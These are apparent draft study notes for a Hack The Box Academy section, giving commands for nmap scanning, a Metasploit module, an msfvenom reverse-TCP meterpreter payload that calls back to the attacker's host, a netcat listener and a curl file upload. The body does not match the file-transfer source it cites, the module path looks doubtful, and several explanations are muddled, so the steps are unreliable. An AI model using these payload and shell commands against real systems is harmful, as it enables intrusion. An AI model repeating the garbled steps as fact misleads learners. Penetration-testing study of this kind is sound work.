---
title: Hack The Box - Academy Module 24 Section 1575
aliases: []
tags:
- topic/hack-the-box-academy
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: 07-024-filetransfers-08-LivingOffTheLand.pdf
related_tools:
- '[[nmap-1787746090]]'
- '[[netcat]]'
- '[[curl]]'
- '[[wget]]'
- '[[msfconsole]]'
- '[[msfvenom]]'
related_techniques:
- '[[t1132]]'
- '[[t1059]]'
related_tactics:
- '[[ta0005]]'
related_services:
- '[[http]]'
- '[[https]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Hack The Box - Academy Module 24 Section 1575

## Introduction
This module covers the use of nmap, netcat, and curl to perform reconnaissance and enumeration of a target. It also includes the use of msfconsole and msfvenom to exploit vulnerabilities.

## Reconnaissance
The first step is to perform a basic nmap scan to gather information about the target. The command used is:
```
$ nmap -sV -O <target>
```
This will provide information about the open ports, services, and operating system of the target.

## Exploitation
Once the target is identified, the next step is to use msfconsole to exploit a vulnerability. The command used is:
```
$ msfconsole
```
Then, use the appropriate exploit module, such as 'exploit/multi/http/brute' for HTTP brute-forcing. The command to run the exploit is:
```
msfconsole > use exploit/multi/http/brute
```
Configure the target and credentials, and then run the exploit with the command:
```
msfconsole > run
```
Alternatively, you can use msfvenom to generate a payload. The command used is:
```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf > payload.elf
```
This will generate a reverse TCP meterpreter payload that can be used to gain a shell on the target.

## Post-Exploitation
After gaining a shell, use netcat or curl to transfer files or execute commands on the target. The command used is:
```
$ nc -lvnp <port>
```
or
```
$ curl -X POST -d @<file> http://<target>/upload
```
This will allow you to upload files or execute commands on the target.

## References
- https://academy.hackthebox.com/module/24/section/1575

